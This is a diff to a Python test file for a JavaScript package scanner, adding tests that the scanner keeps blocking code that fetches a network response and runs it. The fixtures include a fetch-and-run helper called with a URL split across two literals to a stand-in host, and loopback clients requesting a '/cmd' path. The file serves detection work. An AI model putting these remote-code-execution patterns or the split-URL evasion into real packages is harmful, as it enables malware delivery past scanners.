@@ -1,4 +1,4 @@
-"""A response that is run is blocked alone only when it came from an external literal host or a decoded blob (V-a, review 98 doc 21).
+"""A response that is run is blocked alone only when it came from an external literal host or a decoded blob.
 
 `SUSPECT.DROPPER.REMOTE_CODE.001` and `MALWARE.INSTALL.REMOTE_CODE.001` read the body of a network response reaching an
 evaluator or a child process. Across the dev sets the units they block alone are, for the legitimate ones, clients whose
@@ -19,7 +19,10 @@ import tarfile
 from pathlib import Path
 from typing import ClassVar
 
+import pytest
+
 from cordon_scanner import Scanner
+from cordon_scanner.analysis.javascript.flow.origins import RequestOrigins
 from cordon_scanner.analysis.javascript.js_flow import MAX_BYTES
 from cordon_scanner.foundation.config.settings import Config
 from cordon_scanner.foundation.models import Finding, Severity
@@ -154,6 +157,20 @@ class TestAnExternalLiteralHostKeepsTheBlock:
         }
         assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH
 
+    def test_a_url_split_across_literals_handed_to_a_helper_in_another_file(
+        self, tmp_path: Path
+    ) -> None:
+        """The scheme and the host are two literals: no string of the package holds `://`, and the composite still
+        keeps its grade."""
+        files = {
+            "lib/get.js": OriginScanKit.client("url", "module.exports.fetchRun = function (url) {"),
+            "index.js": (
+                "const { fetchRun } = require('./lib/get');\n"
+                "fetchRun('https:' + '//updates.example.invalid/cmd');\n"
+            ),
+        }
+        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH
+
 
 class TestADecodedValueThatIsRunKeepsTheBlock:
     def test_a_decoded_blob_run_elsewhere_in_the_package(self, tmp_path: Path) -> None:
@@ -183,3 +200,21 @@ class TestWhatIsNotKnownKeepsTheBlock:
         assert len(big) > MAX_BYTES
         files = {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'"), "lib/big.js": big}
         assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH
+
+    def test_a_file_whose_origins_pass_the_step_budget_keeps_the_block(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """The loopback client is reported below the gate (above); with its origins past the step budget nothing
+        is known of where it requests, so it keeps its grade."""
+        monkeypatch.setattr(RequestOrigins, "STEP_FLOOR", 0)
+        monkeypatch.setattr(RequestOrigins, "STEPS_PER_TOKEN", 0)
+        files = {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'")}
+        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH
+
+    def test_the_reason_is_not_given_when_the_budget_is_passed(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setattr(RequestOrigins, "STEP_FLOOR", 0)
+        monkeypatch.setattr(RequestOrigins, "STEPS_PER_TOKEN", 0)
+        files = {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'")}
+        assert not OriginScanKit.reason_given(tmp_path, files)
